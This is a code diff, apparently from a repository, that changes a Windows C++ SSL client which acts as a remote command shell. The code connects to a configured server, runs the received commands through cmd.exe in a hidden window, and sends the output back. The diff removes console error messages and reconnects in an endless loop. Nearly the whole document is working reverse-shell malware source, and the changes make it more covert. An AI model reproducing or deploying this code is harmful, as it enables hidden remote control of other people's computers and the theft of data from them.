@@ -13,20 +13,6 @@ class Client {
 public:
     Client(const std::string& serverIP, int serverPort)
             : serverIP(serverIP), serverPort(serverPort), clientSocket(INVALID_SOCKET), sslContext(nullptr), sslSocket(nullptr) {}
-
-
-
-    void ExecuteCommand(SSL* ssl) {
-        char Process[] = "cmd.exe";
-        STARTUPINFO sinfo;
-        PROCESS_INFORMATION pinfo;
-        memset(&sinfo, 0, sizeof(sinfo));
-        sinfo.cb = sizeof(sinfo);
-        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =  (HANDLE)_get_osfhandle(SSL_get_fd(ssl));
-        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
-        WaitForSingleObject(pinfo.hProcess, INFINITE);
-    }
     void SendMessage(SSL* ssl, const char* buffer) {
 
         std::string input(buffer);
@@ -37,22 +23,85 @@ public:
             int bytesRemaining = totalBytes - bytesSent;
             int bytesToSend = (bytesRemaining < 4096) ? bytesRemaining : 4096;
             if (SSL_write(ssl, data + bytesSent, bytesToSend) == -1) {
-                std::cout << "Failed to send data to server " << std::endl;
+
                 break;
             }
             bytesSent += bytesToSend;
         }
     }
+    void ReadOutputFromPipe(HANDLE pipeRead) {
+        char pipeBuffer[4096];
+        DWORD bytesRead;
+
+        while (true) {
+            if (!ReadFile(pipeRead, pipeBuffer, sizeof(pipeBuffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
+                break;  // Error or end of input from the child process
+            }
+
+            pipeBuffer[bytesRead] = '\0';
+            std::string output(pipeBuffer);
+            SendMessage(sslSocket, output.c_str());
+        }
+    }
+
+    void ExecCommand(const std::string& cmd, SOCKET sslSocket) {
+        SECURITY_ATTRIBUTES sa;
+        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+        sa.bInheritHandle = TRUE;
+        sa.lpSecurityDescriptor = NULL;
+
+        HANDLE pipeRead, pipeWrite;
+        if (!CreatePipe(&pipeRead, &pipeWrite, &sa, 0)) {
+            std::string errorMessage = "Failed to create pipe: " + std::to_string(GetLastError());
+            send(sslSocket, errorMessage.c_str(), errorMessage.length(), 0);
+            return;
+        }
+
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+
+        ZeroMemory(&si, sizeof(STARTUPINFOA));
+        si.cb = sizeof(STARTUPINFOA);
+        si.hStdOutput = pipeWrite;  // Redirect child process's stdout to the write end of the pipe
+        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);  // Enable input from the user
+        si.dwFlags |= STARTF_USESTDHANDLES;
+
+        std::string fullCmd = "cmd.exe /C " + cmd; // Construct the full command
+
+        if (!CreateProcessA(NULL, const_cast<char*>(fullCmd.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            std::string errorMessage = "Failed to create child process: " + std::to_string(GetLastError());
+            send(sslSocket, errorMessage.c_str(), errorMessage.length(), 0);
+            CloseHandle(pipeRead);
+            CloseHandle(pipeWrite);
+            return;
+        }
+
+        CloseHandle(pipeWrite);  // Close the write end of the pipe in the parent process
+
+        // Create a separate thread for reading the child process output asynchronously
+        std::thread readThread([&]() {
+            ReadOutputFromPipe(pipeRead);
+        });
+
+        // Wait for the child process to exit
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        // Cleanup
+        CloseHandle(pipeRead);  // Close the read end of the pipe in the parent process
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
+        readThread.join();  // Wait for the reading thread to finish
+    }
+
+
 
     void ReceiveMessage(SSL* ssl) {
-        char buffer[4096];
-        std::string cmd;
         int bytesRead;
 
         while (true) {
             bytesRead = SSL_read(sslSocket, buffer, sizeof(buffer) - 1);
             if (bytesRead <= 0) {
-                std::cout << "Failed to receive data from the server." << std::endl;
                 break;
             }
 
@@ -60,35 +109,18 @@ public:
             std::cout << "Server response: " << buffer << std::endl;
             std::string command(buffer);
             cmd = std::string(buffer, bytesRead);
-            namespace fs = std::filesystem;
 
-            if (cmd == "exit") {
-                    break;
-            }
-            else if (cmd.substr(0, 3) == "cd ") {
-                // Change directory command
-                std::string directory = cmd.substr(3);
-                if (fs::exists(directory) && fs::is_directory(directory)) {
-                    fs::current_path(directory);
-                    SendMessage(sslSocket, "Directory changed");
-                }
-                else {
-                    SendMessage(sslSocket, "Directory Deleted");
-                }
-            }
-            else {
-                    FILE *pipe = _popen(cmd.c_str(), "r");
-                    if (pipe) {
-                        while (!feof(pipe)) {
-                            if (fgets(buffer, sizeof(buffer), pipe) != NULL)
-                                SendMessage(sslSocket, buffer);
-                        }
-                        _pclose(pipe);
-                    } else {
-                        std::cerr << "Failed to execute command" << std::endl;
-                        break;
-                    }
-                }
+            if(cmd == "scmd")
+                is_cmd = true;
+
+            if(is_cmd == true)
+                ExecCommand(cmd, reinterpret_cast<SOCKET>(sslSocket));
+
+            if(cmd == "exit")
+                is_cmd = false;
+
+            if (cmd == "quit")
+                break;
 
         }
 
@@ -119,7 +151,7 @@ public:
         }
 
         if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
-            std::cout << "Failed to connect to the server." << std::endl;
+
             closesocket(clientSocket);
             WSACleanup();
             return false;
@@ -153,7 +185,7 @@ public:
 
         // Perform SSL handshake
         if (SSL_connect(sslSocket) != 1) {
-            std::cout << "Failed to perform SSL handshake." << std::endl;
+
             SSL_free(sslSocket);
             SSL_CTX_free(sslContext);
             closesocket(clientSocket);
@@ -178,6 +210,9 @@ public:
     }
 
 private:
+    char buffer[4096];
+    bool is_cmd;
+    std::string cmd;
     std::string serverIP;
     int serverPort;
     SOCKET clientSocket;
@@ -192,9 +227,8 @@ int main() {
     while (true) {
         if (client.Connect()) {
             client.Run();
+            client.Detach();
         }
-        client.Detach();
     }
-
     return 0;
 }
